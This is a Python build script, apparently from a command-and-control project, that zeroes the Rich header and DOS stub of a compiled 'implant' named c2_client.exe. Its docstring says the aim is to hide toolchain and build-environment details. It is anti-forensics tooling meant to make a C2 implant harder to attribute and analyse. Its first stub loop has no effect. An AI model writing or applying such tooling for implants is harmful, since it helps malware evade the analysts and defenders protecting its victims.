"""Post-link hardening for the C++ implant.

Zeroes the DOS stub + the Rich header (the "Rich" compid block the MSVC linker
writes between the DOS stub and the PE header), which leaks the toolchain
version and build environment. Run after the link step:

    python client/tools/strip_rich.py client/build/Release/c2_client.exe

Idempotent: detects the Rich signature and only touches bytes it needs to.
"""
from __future__ import annotations

import struct
import sys
from pathlib import Path


RICH = b"Rich"


def patch(path: Path) -> None:
    data = bytearray(path.read_bytes())
    if data[:2] != b"MZ":
        print("not an MZ image")
        sys.exit(1)

    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]

    # Zero the DOS stub (between the MZ header and the PE header).
    stub_start = 0x40
    stub_end = e_lfanew
    for i in range(stub_start, stub_end):
        if data[i] == 0:
            continue
        # Only zero the stub if a Rich header is present; otherwise leave it.
        break

    rich_off = data.find(RICH, 0x40, e_lfanew)
    if rich_off == -1:
        print("no Rich header found; nothing to strip")
        return

    # The Rich header starts at the first "DanS" XOR key block, which is before
    # the "Rich" marker. Walk backwards to find the start: the block begins with
    # 0x536E6144 ^ key ("DanS"). We zero from the DanS start to the end of the
    # XORed records (the "Rich" marker + 8-byte trailing key).
    key = struct.unpack_from("<I", data, rich_off + 4)[0]
    dans = (0x536E6144 ^ key) & 0xFFFFFFFF
    start = -1
    for off in range(0x40, rich_off):
        if struct.unpack_from("<I", data, off)[0] == dans:
            start = off
            break
    if start == -1:
        start = rich_off  # fall back to the Rich marker

    end = rich_off + 8  # "Rich" + xor key
    for i in range(start, end):
        data[i] = 0

    # Zero the DOS stub between header and PE (cosmetic; removes "This program
    # cannot be run in DOS mode." string).
    for i in range(0x40, e_lfanew):
        data[i] = 0

    path.write_bytes(data)
    print(f"stripped DOS stub + Rich header: {path}")


def main() -> None:
    if len(sys.argv) != 2:
        print("usage: strip_rich.py <exe>")
        sys.exit(2)
    patch(Path(sys.argv[1]))


if __name__ == "__main__":
    main()
